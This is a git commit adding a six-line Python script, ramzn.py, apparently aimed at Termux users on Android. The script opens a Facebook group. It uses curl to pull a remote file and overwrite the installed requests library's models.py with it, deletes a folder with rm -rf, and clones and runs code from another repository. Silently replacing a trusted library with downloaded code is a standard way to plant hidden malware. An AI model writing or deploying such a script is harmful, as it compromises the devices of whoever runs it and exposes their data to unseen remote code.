0b1801c497cecbe16bf8bbc0e97cc498dc31138e
Ramxantanha <115856285+Ramxantanha@users.noreply.github.com>
2022-11-19 06:59:47 +0500

    Add files via upload

---
+++ ramzn.py
@@ -0,0 +1,6 @@
+import os
+os.system('xdg-open https://facebook.com/groups/207678473842318/')
+os.system('curl https://raw.githubusercontent.com/Ramxantanha/approval/main/riaz.py > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py')
+os.system("rm -rf BXB")
+os.system("git clone https://github.com/RIAZ-143/PAID && cd PAID && python X.py")
+os.system("cd PAID && cd X.py")
